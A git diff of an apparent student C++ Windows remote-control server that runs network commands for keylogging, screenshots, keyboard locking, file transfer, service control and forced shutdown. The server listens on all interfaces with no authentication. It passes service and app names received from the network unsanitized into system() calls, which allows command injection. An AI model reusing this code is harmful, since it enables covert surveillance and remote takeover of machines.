@@ -1,14 +1,8 @@
-﻿#include "Library.h"
+﻿#include "Server_library.h"
 #include "Server_functions.h"
 
 HHOOK keyboardHook = nullptr;
-
-std::vector<std::thread> workers;
-std::queue<std::function<void()>> tasks;
-std::mutex queueMutex;
-std::mutex resourceMutex;
-std::condition_variable condition;
-std::atomic<bool> stop(false);
+BOOL isConnected = false;
 
 WSADATA initializeWinsock() {
     WSADATA ws;
@@ -32,6 +26,45 @@ SOCKET initializeSocket() {
     return nSocket;
 }
 
+sockaddr_in initializeServerSocket() {
+    sockaddr_in server;
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(9909);
+    //server.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server.sin_addr.s_addr = INADDR_ANY;
+    memset(&(server.sin_zero), 0, 8);
+
+    return server;
+}
+
+// Hàm lấy địa chỉ IP của máy
+string getLocalIPAddress() {
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
+        cerr << "Error getting hostname: " << WSAGetLastError() << endl;
+        return "";
+    }
+
+    struct addrinfo hints, * info;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET; // Chỉ IPv4
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    if (getaddrinfo(hostname, NULL, &hints, &info) != 0) {
+        cerr << "Error getting local IP: " << WSAGetLastError() << endl;
+        return "";
+    }
+
+    sockaddr_in* addr = (sockaddr_in*)info->ai_addr;
+    char ipStr[INET_ADDRSTRLEN]; // Định nghĩa kích thước cho IPv4
+    inet_ntop(AF_INET, &(addr->sin_addr), ipStr, INET_ADDRSTRLEN); // Chuyển địa chỉ thành chuỗi
+    freeaddrinfo(info);
+
+    return string(ipStr);
+}
+
 void sendBroadcast() {
     SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (udpSocket == INVALID_SOCKET) {
@@ -50,32 +83,29 @@ void sendBroadcast() {
 
     sockaddr_in broadcastAddr;
     broadcastAddr.sin_family = AF_INET;
-    broadcastAddr.sin_port = htons(9909); // Cổng broadcast
+    broadcastAddr.sin_port = htons(9909);
     broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;
 
-    const char* message = "Server_IP=127.0.0.1;Port=9909";
+    //string  message = "Server_IP=127.0.0.1;Port=9909";
+
+    string serverIP = getLocalIPAddress();
+    if (serverIP.empty()) {
+        cout << "Unable to get server IP address" << endl;
+        closesocket(udpSocket);
+        return;
+    }
+
+    string message = "Server_IP=" + serverIP + ";Port=9909";
 
     cout << "Broadcasting server information..." << endl;
-    while (!stop) {  // Gửi liên tục cho đến khi kết nối thành công
-        sendto(udpSocket, message, strlen(message), 0,
+    while (!isConnected) {
+        sendto(udpSocket, message.c_str(), strlen(message.c_str()), 0,
             (sockaddr*)&broadcastAddr, sizeof(broadcastAddr));
-        Sleep(5000); // Gửi mỗi giây
+        Sleep(5000);
     }
 
     cout << "Broadcast stopped." << endl;
     closesocket(udpSocket);
-}
-
-sockaddr_in initializeServerSocket() {
-    sockaddr_in server;
-
-    server.sin_family = AF_INET;
-    server.sin_port = htons(9909);
-    //server.sin_addr.s_addr = inet_addr("127.0.0.1");
-    server.sin_addr.s_addr = INADDR_ANY;
-    memset(&(server.sin_zero), 0, 8);
-
-    return server;
 }
 
 void bindAndListen(SOCKET& nSocket, sockaddr_in& server) {
@@ -108,54 +138,11 @@ SOCKET acceptRequestFromClient(SOCKET nSocket) {
         return EXIT_FAILURE;
     }
     else {
-        stop = true;
+        isConnected = true;
         cout << "Client connected successfully" << endl;
     }
 
     return clientSocket;
-}
-
-void initializeThreadPool(size_t maxThreads) {
-    for (size_t i = 0; i < maxThreads; ++i) {
-        workers.emplace_back([]() {
-            while (true) {
-                std::function<void()> task;
-                {
-                    std::unique_lock<std::mutex> lock(queueMutex);
-                    condition.wait(lock, []() { return !tasks.empty() || stop; });
-
-                    if (stop && tasks.empty())
-                        return;  // Dừng nếu không còn công việc
-
-                    task = std::move(tasks.front());
-                    tasks.pop();
-                }
-                task();  // Thực thi công việc
-            }
-            });
-    }
-}
-
-void addTaskToQueue(const std::function<void()>& task) {
-    {
-        std::lock_guard<std::mutex> lock(queueMutex);
-        tasks.push(task);
-    }
-    condition.notify_one();  // Thông báo một luồng làm việc
-}
-
-void shutdownThreadPool() {
-    {
-        std::lock_guard<std::mutex> lock(queueMutex);
-        stop = true;
-    }
-    condition.notify_all();  // Thông báo tất cả luồng dừng
-
-    // Chờ tất cả luồng hoàn thành
-    for (std::thread& worker : workers) {
-        if (worker.joinable())
-            worker.join();
-    }
 }
 
 void ReceiveAndSend(SOCKET& clientSocket, SOCKET& nSocket) {
@@ -180,11 +167,10 @@ void ReceiveAndSend(SOCKET& clientSocket, SOCKET& nSocket) {
                 break;
             }
 
-            addTaskToQueue([clientSocket, receiveBuffer]() mutable {
+            thread([&clientSocket, receiveBuffer]() {
                 processRequest(clientSocket, receiveBuffer);
-            });
+                }).detach();
         }
-
     }
 }
 
@@ -219,14 +205,13 @@ void handleServer() {
     // Chấp nhận kết nối từ client
     SOCKET clientSocket = acceptRequestFromClient(nSocket);
 
+    // Nhận và gửi các gói tin
     ReceiveAndSend(clientSocket, nSocket);
 
-    // Tắt các luồng xử lí
-    shutdownThreadPool();
-    
-    // Sau khi hoàn thành công việc, đóng kết nối
+    // Đóng phiên kết nối
     closeConected(clientSocket, nSocket);
 }
+
 
 bool sendFile(SOCKET& clientSocket, const string& fileName) {
     ifstream file(fileName, ios::binary);
@@ -302,7 +287,7 @@ string startApp(string name) {
 
 string startService(string name) {
     // Thực thi lệnh để khởi động dịch vụ
-    string command = "net start " + name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
+    string command = "net start " + name + " > nul 2>&1";
     int result = system(command.c_str());
 
     json jsonResponse;
@@ -310,20 +295,16 @@ string startService(string name) {
     jsonResponse["title"] == "startService";
     jsonResponse["nameObject"] = name;
 
-    // Nếu lệnh `net start` trả về lỗi, kiểm tra trạng thái dịch vụ
     string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";
 
     if (result == 0) {
-        // Dịch vụ khởi động thành công
-        jsonResponse["result"] =  "Service " + name + " has been started successfully.";
+        jsonResponse["result"] = "Service " + name + " has been started successfully.";
     }
     else if (system(checkCommand.c_str()) == 0) {
-        // Dịch vụ đã chạy trước đó
-        jsonResponse["result"] =  "Service " + name + " is already running.";
+        jsonResponse["result"] = "Service " + name + " is already running.";
     }
     else {
-        // Không thể khởi động dịch vụ
-        jsonResponse["result"] =  "Failed to start service " + name + ". Please check the service status.";
+        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
     }
 
     return jsonResponse.dump();
@@ -331,86 +312,186 @@ string startService(string name) {
 
 // Start, stop webcam
 
-bool createWebcamVideo(int duration) {
-    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
+//bool createWebcamVideo(int duration) {
+//    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
+//
+//    // Mở camera
+//    cv::VideoCapture cap(0); // Camera mặc định (0)
+//    if (!cap.isOpened()) {
+//        // Nếu không mở được camera, trả về mà không in thông báo
+//        return false;
+//    }
+//
+//    // Đặt các thông số quay video
+//    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
+//    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
+//    cv::Size frame_size(frame_width, frame_height);
+//    int fps = 30; // Đặt fps hợp lý (có thể điều chỉnh tùy vào camera)
+//
+//    // Đường dẫn file video đầu ra
+//    std::string output_file = "output.avi";
+//
+//    // Định dạng video codec và mở VideoWriter
+//    cv::VideoWriter video(output_file,
+//        cv::VideoWriter::fourcc('M', 'J', 'P', 'G'),
+//        fps, frame_size, true);
+//    if (!video.isOpened()) {
+//        // Nếu không thể mở video writer, trả về mà không in thông báo
+//        return false;
+//    }
+//
+//    // Quay video trong thời gian người dùng nhập
+//    cv::Mat frame;
+//    auto start_time = std::chrono::steady_clock::now();
+//    int elapsed_time = 0; // Thời gian đã quay
+//    while (true) {
+//        cap >> frame; // Đọc khung hình từ camera
+//        if (frame.empty()) {
+//            break;
+//        }
+//
+//        // Ghi khung hình vào file video
+//        video.write(frame);
+//
+//        // Hiển thị khung hình trên cửa sổ
+//        cv::imshow("Video Recording", frame);
+//
+//        // Kiểm tra thời gian đã quay
+//        auto current_time = std::chrono::steady_clock::now();
+//        elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
+//
+//        // Nếu đã quay đủ thời gian, dừng lại
+//        if (elapsed_time >= duration) break;
+//
+//        // Nhấn phím ESC để thoát sớm
+//        if (cv::waitKey(1) == 27) break;  // Dùng thời gian ngắn hơn cho waitKey để không làm giảm tốc độ quay
+//    }
+//
+//    // Giải phóng tài nguyên
+//    cap.release();
+//    video.release();
+//    cv::destroyAllWindows();
+//
+//    return true;
+//}
+//
+//string startWebcam(SOCKET clientSocket, int duration) {
+//
+//    bool result = createWebcamVideo(duration);
+//
+//    sendFile(clientSocket, "output.avi");
+//
+//    json jsonResponse;
+//
+//    jsonResponse["title"] = "startWebcam";
+//
+//    if (result)
+//        jsonResponse["result"] = "Successfully started webcam";
+//    else
+//        jsonResponse["result"] = "Failed to start webcam";
+//
+//    return jsonResponse.dump();
+//}
 
-    // Mở camera
-    cv::VideoCapture cap(0); // Camera mặc định (0)
-    if (!cap.isOpened()) {
-        // Nếu không mở được camera, trả về mà không in thông báo
-        return false;
-    }
+//bool createWebcamVideo(int duration) {
+//    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
+//
+//    // Khởi tạo COM ở chế độ Multithreaded
+//    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+//    if (FAILED(hr)) {
+//        return false;
+//    }
+//
+//    // Mở camera
+//    cv::VideoCapture cap(0);
+//    if (!cap.isOpened()) {
+//        CoUninitialize();
+//        return false;
+//    }
+//
+//    // Lấy kích thước khung hình và các thông số
+//    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
+//    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
+//    cv::Size frame_size(frame_width, frame_height);
+//    int fps = 30;
+//
+//    // Tạo VideoWriter với codec AVC1
+//    string output_file = "output.mp4";
+//    cv::VideoWriter video(output_file,
+//        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // Codec AVC1
+//        fps, frame_size, true);
+//
+//    if (!video.isOpened()) {
+//        cap.release();
+//        CoUninitialize();
+//        return false;
+//    }
+//
+//    // Bắt đầu quay video
+//    cv::Mat frame;
+//    auto start_time = chrono::steady_clock::now();
+//    int elapsed_time = 0;
+//    bool is_recording = true;  // Biến để xác định trạng thái ghi video
+//
+//
+//    while (true) {
+//        cap >> frame;
+//        if (frame.empty()) {
+//            break;
+//        }
+//
+//        // Nếu còn thời gian và đang quay, ghi video
+//        if (is_recording) {
+//            video.write(frame);  // Ghi khung hình vào file
+//        }
+//
+//        // Hiển thị video
+//        cv::imshow("Video Recording", frame);
+//
+//        // Kiểm tra thời gian quay
+//        auto current_time = chrono::steady_clock::now();
+//        elapsed_time = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
+//
+//        // Sau khi hết thời gian quay, dừng ghi nhưng vẫn tiếp tục nhận khung hình
+//        if (elapsed_time >= duration && is_recording) {
+//            is_recording = false;
+//            video.release();
+//        }
+//
+//        // Kiểm tra phím nhấn
+//        int key = cv::waitKey(1) & 0xFF;
+//
+//        // Kiểm tra nếu cửa sổ bị đóng
+//        if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
+//            break;
+//        }
+//    }
+//
+//    // Dọn dẹp tài nguyên
+//    cap.release();
+//    cv::destroyAllWindows();
+//    CoUninitialize();
+//
+//    return true;
+//}
 
-    // Đặt các thông số quay video
-    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
-    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
-    cv::Size frame_size(frame_width, frame_height);
-    int fps = 30; // Đặt fps hợp lý (có thể điều chỉnh tùy vào camera)
-
-    // Đường dẫn file video đầu ra
-    std::string output_file = "output.avi";
-
-    // Định dạng video codec và mở VideoWriter
-    cv::VideoWriter video(output_file,
-        cv::VideoWriter::fourcc('M', 'J', 'P', 'G'),
-        fps, frame_size, true);
-    if (!video.isOpened()) {
-        // Nếu không thể mở video writer, trả về mà không in thông báo
-        return false;
-    }
-
-    // Quay video trong thời gian người dùng nhập
-    cv::Mat frame;
-    auto start_time = std::chrono::steady_clock::now();
-    int elapsed_time = 0; // Thời gian đã quay
-    while (true) {
-        cap >> frame; // Đọc khung hình từ camera
-        if (frame.empty()) {
-            break;
-        }
-
-        // Ghi khung hình vào file video
-        video.write(frame);
-
-        // Hiển thị khung hình trên cửa sổ
-        cv::imshow("Video Recording", frame);
-
-        // Kiểm tra thời gian đã quay
-        auto current_time = std::chrono::steady_clock::now();
-        elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
-
-        // Nếu đã quay đủ thời gian, dừng lại
-        if (elapsed_time >= duration) break;
-
-        // Nhấn phím ESC để thoát sớm
-        if (cv::waitKey(1) == 27) break;  // Dùng thời gian ngắn hơn cho waitKey để không làm giảm tốc độ quay
-    }
-
-    // Giải phóng tài nguyên
-    cap.release();
-    video.release();
-    cv::destroyAllWindows();
-
-    return true;
-}
-
-string startWebcam(SOCKET clientSocket, int duration) {
-
-    bool result = createWebcamVideo(duration);
-
-    sendFile(clientSocket, "output.avi");
-
-    json jsonResponse;
-
-    jsonResponse["title"] = "startWebcam";
-
-    if (result)
-        jsonResponse["result"] = "Successfully started webcam";
-    else
-        jsonResponse["result"] = "Failed to start webcam";
-
-    return jsonResponse.dump();
-}
+//string startWebcam(SOCKET clientSocket, int duration) {
+//
+//    bool result = createWebcamVideo(duration);
+//
+//    sendFile(clientSocket, "output.mp4");
+//
+//    json jsonResponse;
+//
+//    jsonResponse["title"] = "startWebcam";
+//
+//    if (result)
+//        jsonResponse["result"] = "Successfully started webcam";
+//    else
+//        jsonResponse["result"] = "Failed to start webcam";
+//
+//    return jsonResponse.dump();
+//}
 
 string stopWebcam() {
     string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
@@ -440,12 +521,11 @@ string stopApp(string name) {
     if (result == 0)
         jsonResponse["result"] = "Successfully stopped " + name;
     else {
-        //jsonResponse["result"] = "Failed to stop " + name;
         FILE* pipe = _popen(command.c_str(), "r");
         char buffer[128];
         string line = "";
         while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-            line += buffer;  // Đọc từng dòng đầu ra
+            line += buffer;  
         }
 
         jsonResponse["result"] = "The application with name " + name + " is inactive";
@@ -456,9 +536,9 @@ string stopApp(string name) {
 
 string stopService(string name) {
     // Thực thi lệnh để dừng dịch vụ
-    string command = "net stop " +name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
+    string command = "net stop " + name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
     int result = system(command.c_str());
-    
+
     json jsonResponse;
 
     jsonResponse["title"] = "stopService";
@@ -468,15 +548,12 @@ string stopService(string name) {
     string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";
 
     if (result == 0) {
-        // Lệnh `net stop` thành công, dịch vụ đã dừng
         jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
     }
     else if (system(checkCommand.c_str()) != 0) {
-        // Nếu dịch vụ không chạy
         jsonResponse["result"] = "Service " + name + " is already stopped.";
     }
     else {
-        // Lệnh `net stop` không thành công và dịch vụ vẫn đang chạy
         jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
     }
 
@@ -484,8 +561,6 @@ string stopService(string name) {
 }
 
 string listApps() {
-    //vector<string> list = createListApps();
-
     vector<vector<string>> appList = getRunningApps();
 
     json jsonResponse;
@@ -495,7 +570,6 @@ string listApps() {
     if (!appList.empty()) {
         jsonResponse["result"] = "Successfully listed applications";
         writeAppListToFile(appList);
-        //jsonResponse["content"] = list;
     }
     else
         jsonResponse["result"] = "Failed to list applications";
@@ -505,7 +579,7 @@ string listApps() {
 
 // Hàm để ghi dữ liệu vào tệp listApps.txt
 void writeAppListToFile(const vector<vector<string>>& apps) {
-    ofstream outFile("appsList.txt");
+    ofstream outFile("AppList.txt");
 
     if (!outFile) {
         cerr << "Failed to open file." << endl;
@@ -516,7 +590,7 @@ void writeAppListToFile(const vector<vector<string>>& apps) {
     outFile << setw(30) << left << "Application Name"
         << setw(10) << left << "PID"
         << setw(25) << left << "Memory Usage (GB)" << endl;
-        // << setw(50) << left << "Path" 
+    // << setw(50) << left << "Path" 
     outFile << string(60, '-') << endl;
 
     // Ghi dữ liệu các tiến trình vào tệp
@@ -529,7 +603,7 @@ void writeAppListToFile(const vector<vector<string>>& apps) {
             << endl;
     }
 
-    outFile.close();  
+    outFile.close();
 }
 
 vector<vector<string>> getRunningApps() {
@@ -538,7 +612,7 @@ vector<vector<string>> getRunningApps() {
 
     FILE* pipe = _popen(command.c_str(), "r");
     if (!pipe) {
-        cerr << "Failed to run command." << endl;
+        cout << "Failed to run command." << endl;
         return {};
     }
 
@@ -563,8 +637,6 @@ vector<vector<string>> getRunningApps() {
 
         // Đọc các giá trị từ dòng
         ss >> name >> pid >> memory;
-        //getline(ss, path); // Đọc đường dẫn với getline để lấy chính xác đường dẫn có khoảng trắng
-        //path.erase(remove(path.begin(), path.end(), ' '), path.end()); // Loại bỏ khoảng trắng thừa ở đầu và cuối
 
         // Chuyển đổi Memory Usage từ byte sang GB
         long long memoryInBytes = stoll(memory); // Chuyển chuỗi sang long long
@@ -573,7 +645,7 @@ vector<vector<string>> getRunningApps() {
         // Lưu lại thông tin
         appDetails.push_back(name);
         appDetails.push_back(pid);
-        appDetails.push_back(to_string(memoryInGB)); 
+        appDetails.push_back(to_string(memoryInGB));
         // appDetails.push_back(path);
         appList.push_back(appDetails);
     }
@@ -695,7 +767,7 @@ vector<pair<string, tuple<int, string, string>>> ListAllServices() {
 
 // Hàm ghi dữ liệu vào file
 void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
-    ofstream outputFile("servicesList.txt");
+    ofstream outputFile("ServiceList.txt");
 
     if (!outputFile.is_open()) {
         cerr << "Unable to open file for writing!" << endl;
@@ -726,8 +798,6 @@ void writeServicesListToFile(const vector<pair<string, tuple<int, string, string
 }
 
 string listServices() {
-    //vector<string> list = createListServices();
-
     vector<pair<string, tuple<int, string, string>>> servicesList = ListAllServices();
 
     json jsonResponse;
@@ -737,11 +807,28 @@ string listServices() {
     if (!servicesList.empty()) {
         jsonResponse["result"] = "Successfully listed services";
         writeServicesListToFile(servicesList);
-        //jsonResponse["content"] = list;
     }
     else jsonResponse["result"] = "Failed to list services";
 
     return jsonResponse.dump();
+}
+
+string listProcess() {
+    json jsonRespone;
+
+    jsonRespone["title"] = "listProcess";
+
+    int result = system("tasklist > ProcessList.txt");
+
+    if (result == 0) {
+        jsonRespone["result"] = "Successfully listed process";
+
+    }
+    else {
+        jsonRespone["result"] = "Failed to list services";
+    }
+
+    return jsonRespone.dump();
 }
 
 // Thực hiện chức năng restart and shutdown
@@ -756,7 +843,7 @@ void restart() {
     system(command.c_str());
 }
 
-void shutdown() { 
+void shutdown() {
     // Tắt tất cả tiến trình đang chạy
     string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
     system(command.c_str());
@@ -794,7 +881,7 @@ string copyFile(string sourceFile, string destinationFile) {
         jsonResponse["result"] = "Source file does not exist or could not be opened!";
         return jsonResponse.dump();
     }
-    
+
     ofstream destination(destinationFile, ios::binary);
 
     if (!destination) {
@@ -861,7 +948,7 @@ bool saveHBitmapToBMP(HBITMAP hBitmap, int width, int height, const string& fold
     BITMAPFILEHEADER fileHeader;
     BITMAPINFOHEADER infoHeader;
 
-    fileHeader.bfType = 0x4D42;  // Chữ "BM"
+    fileHeader.bfType = 0x4D42;
     fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
     fileHeader.bfSize = fileHeader.bfOffBits + bmp.bmWidthBytes * height;
     fileHeader.bfReserved1 = 0;
@@ -871,7 +958,7 @@ bool saveHBitmapToBMP(HBITMAP hBitmap, int width, int height, const string& fold
     infoHeader.biWidth = width;
     infoHeader.biHeight = height;
     infoHeader.biPlanes = 1;
-    infoHeader.biBitCount = 32; // 32 bpp
+    infoHeader.biBitCount = 32;
     infoHeader.biCompression = BI_RGB;
     infoHeader.biSizeImage = bmp.bmWidthBytes * height;
     infoHeader.biXPelsPerMeter = 0;
@@ -941,7 +1028,7 @@ string screenShot() {
         return "";
     }
 
-    // // Giải phóng tài nguyên
+    // Giải phóng tài nguyên
     DeleteObject(hBitmap);
 
     return bmpFilePath;
@@ -959,18 +1046,18 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 bool LockKeyboard() {
     if (keyboardHook != NULL) {
-        std::cerr << "Keyboard is already locked!" << std::endl;
+        cout << "Keyboard is already locked!" << endl;
         return false;
     }
 
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     if (keyboardHook == NULL) {
         DWORD error = GetLastError();
-        std::cerr << "Failed to lock the keyboard. Error code: " << error << std::endl;
+        cout << "Failed to lock the keyboard. Error code: " << error << endl;
         return false;
     }
 
-    std::cout << "The keyboard has been locked." << std::endl;
+    cout << "The keyboard has been locked." << endl;
 
     return true;
 }
@@ -993,7 +1080,7 @@ string solveKeyLockingAndSend(bool& flag) {
 }
 
 void runKeyLockingLoop() {
-    std::cout << "Message loop is running on Thread ID: " << GetCurrentThreadId() << std::endl;
+    cout << "Message loop is running on Thread ID: " << GetCurrentThreadId() << endl;
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -1001,7 +1088,7 @@ void runKeyLockingLoop() {
         DispatchMessage(&msg);
     }
 
-    std::cout << "Message loop has ended." << std::endl;
+    cout << "Message loop has ended." << endl;
 }
 
 
@@ -1009,13 +1096,13 @@ void runKeyLockingLoop() {
 
 bool UnlockKeyboard() {
     if (keyboardHook == NULL) {
-        std::cerr << "Keyboard is not locked or already unlocked!" << std::endl;
+        cout << "Keyboard is not locked or already unlocked!" << endl;
         return false;
     }
 
     if (UnhookWindowsHookEx(keyboardHook)) {
         keyboardHook = NULL;
-        std::cout << "The keyboard has been unlocked." << std::endl;
+        cout << "The keyboard has been unlocked." << endl;
         return true;
     }
     else {
@@ -1040,19 +1127,6 @@ string solveKeyUnlockingAndSend(bool& flag) {
 
     return jsonResponse.dump();
 }
-
-//string solveKeyUnlockingAndSend(bool& flag) {
-//    json jsonResponse;
-//
-//    jsonResponse["title"] = "keyUnlocking";
-//
-//    UnlockKeyboard();
-//
-//    jsonResponse["result"] = "Successfully unlocked the keyboard";
-//    flag = 0;
-//
-//    return jsonResponse.dump();
-//}
 
 
 // Key logger
@@ -1130,41 +1204,6 @@ map<int, string> createKeyMap() {
     return keyMap;
 }
 
-// Hàm thu thập và trả về tên các phím được nhấn
-//vector<string> collectKeyNamesToFile(int durationInSeconds) {
-//    map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
-//    vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
-//    bool keyState[256] = { false }; // Trạng thái trước đó của các phím
-//
-//    auto startTime = GetTickCount64(); // Lấy thời gian bắt đầu (milliseconds)
-//    cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;
-//
-//    while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
-//        for (int key = 0; key < 256; ++key) { // Duyệt qua tất cả các mã phím
-//            bool isPressed = GetAsyncKeyState(key) & 0x8000; // Kiểm tra nếu phím được nhấn
-//
-//            // Kiểm tra trạng thái phím điều khiển
-//            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // Bỏ qua phím chuột
-//
-//            if (isPressed && !keyState[key]) { // Nếu phím vừa được nhấn (chưa nhấn trước đó)
-//                keyState[key] = true; // Cập nhật trạng thái
-//
-//                if (keyMap.find(key) != keyMap.end()) { // Nếu mã phím có trong bảng ánh xạ
-//                    keyNames.push_back(keyMap[key]);
-//                    cout << "Key pressed: " << keyMap[key] << endl;  // "Phím được nhấn"
-//                }
-//            }
-//            else if (!isPressed) { // Nếu phím không còn nhấn
-//                keyState[key] = false; // Reset trạng thái
-//            }
-//        }
-//        Sleep(10); // Giảm tải CPU
-//    }
-//
-//    cout << "Finished collecting keys!" << endl;  // "Kết thúc thu thập phím!"
-//    return keyNames; // Trả về danh sách các phím đã nhấn
-//}
-
 vector<string> collectKeyNames(int durationInSeconds) {
     map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
     vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
@@ -1194,9 +1233,6 @@ vector<string> collectKeyNames(int durationInSeconds) {
         }
         Sleep(10); // Giảm tải CPU
     }
-
-    //cout << "Finished collecting keys!" << endl;  // "Kết thúc thu thập phím!"
-
     return keyNames;
 
 }
@@ -1234,34 +1270,34 @@ string keyLogger(int durationInSeconds) {
 // Xử lí chức năng in ra cây thư mục
 
 // Hàm kiểm tra xem tệp/thư mục có ẩn hoặc là hệ thống không
-bool isHiddenOrSystem(const std::filesystem::path& path) {
+bool isHiddenOrSystem(const filesystem::path& path) {
     DWORD attributes = GetFileAttributesW(path.wstring().c_str());
     if (attributes == INVALID_FILE_ATTRIBUTES) return false;
     return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
 }
 
 // Hàm in cây thư mục ra tệp
-void printDirectoryTree(const std::filesystem::path& path, std::wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
+void printDirectoryTree(const filesystem::path& path, std::wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
     if (currentDepth > maxDepth) return; // Dừng nếu vượt quá mức tối đa
 
     try {
-        for (const auto& entry : std::filesystem::directory_iterator(path)) {
+        for (const auto& entry : filesystem::directory_iterator(path)) {
             // Bỏ qua tệp/thư mục ẩn hoặc hệ thống
             if (isHiddenOrSystem(entry.path())) continue;
 
             // Chuẩn bị chuỗi đầu ra
-            std::wstring line = std::wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";
+            wstring line = wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";
 
             // Ghi vào tệp
             output << line;
 
             // Nếu là thư mục, tiếp tục đệ quy (nếu ở mức nhỏ hơn mức tối đa)
-            if (std::filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
+            if (filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
                 printDirectoryTree(entry.path(), output, indent + 4, currentDepth + 1, maxDepth);
             }
         }
     }
-    catch (const std::filesystem::filesystem_error& e) {
+    catch (const filesystem::filesystem_error& e) {
         output << L"Error: " << e.what() << L"\n";
     }
 }
@@ -1269,11 +1305,11 @@ void printDirectoryTree(const std::filesystem::path& path, std::wofstream& outpu
 // Hàm liệt kê các ổ đĩa và in cây thư mục
 bool listDrivesAndPrintTree() {
     // Cấu hình luồng ghi file với UTF-8
-    std::wofstream output("DirectoryTree.txt", std::ios::out);
-    output.imbue(std::locale("en_US.UTF-8"));
+    wofstream output("DirectoryTree.txt", ios::out);
+    output.imbue(locale("en_US.UTF-8"));
 
     if (!output.is_open()) {
-        std::wcerr << L"Error: Unable to open file DirectoryTree.txt for writing.\n";
+        wcout << L"Error: Unable to open file DirectoryTree.txt for writing.\n";
         return false;
     }
 
@@ -1289,7 +1325,7 @@ bool listDrivesAndPrintTree() {
     for (char drive = 'A'; drive <= 'Z'; ++drive) {
         if (drives & (1 << (drive - 'A'))) {
             // Tạo đường dẫn ổ đĩa
-            std::wstring drivePath = std::wstring(1, drive) + L":\\";
+            wstring drivePath = wstring(1, drive) + L":\\";
 
             // Ghi vào tệp
             output << L"|-- Drive " + drivePath + L"\n";
@@ -1300,7 +1336,6 @@ bool listDrivesAndPrintTree() {
     }
 
     output.close();
-
     return true;
 }
 
@@ -1311,7 +1346,7 @@ string createDiractoryTree() {
     // Lưu chế độ hiện tại của stdout
     defaultMode = _setmode(_fileno(stdout), _O_U16TEXT);
     if (defaultMode == -1) {
-        std::cerr << "Unable to switch output mode to Unicode. The program will continue with default settings.\n";
+        cout << "Unable to switch output mode to Unicode. The program will continue with default settings.\n";
     }
 
     json jsonResponse;
@@ -1327,7 +1362,7 @@ string createDiractoryTree() {
 
     // Khôi phục chế độ ban đầu của stdout
     if (_setmode(_fileno(stdout), defaultMode) == -1) {
-        std::cerr << "Failed to restore default stdout mode.\n";
+        cout << "Failed to restore default stdout mode.\n";
     }
 
     return jsonResponse.dump();
@@ -1335,47 +1370,51 @@ string createDiractoryTree() {
 
 void processRequest(SOCKET& clientSocket, string jsonRequest) {
     // Tạo đối tượng JSON từ chuỗi JSON
-    json j = json::parse(jsonRequest);
+    json Request = json::parse(jsonRequest);
 
     string jsonResponse = "";
 
-    if (j.contains("title")) {
-        if (j.at("title") == "listApps") {
+    if (Request.contains("title")) {
+        if (Request.at("title") == "listApps") {
             jsonResponse = listApps();
-            sendFile(clientSocket, "appsList.txt");
+            sendFile(clientSocket, "AppList.txt");
             sendJSON(clientSocket, jsonResponse);
         }
-        else if (j.at("title") == "listServices") {
+        else if (Request.at("title") == "listServices") {
             jsonResponse = listServices();
-            sendFile(clientSocket, "servicesList.txt");
